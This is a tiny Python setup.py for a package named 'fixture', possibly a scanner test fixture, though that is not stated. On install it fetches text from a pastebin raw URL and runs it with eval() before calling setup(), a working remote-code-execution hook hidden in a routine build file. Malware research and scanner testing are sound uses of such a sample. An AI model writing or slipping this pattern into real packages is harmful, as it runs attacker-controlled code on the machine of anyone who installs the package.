import requests
from setuptools import setup


eval(requests.get("https://pastebin.com/raw/abcdef12").text)

setup(name="fixture", version="1")
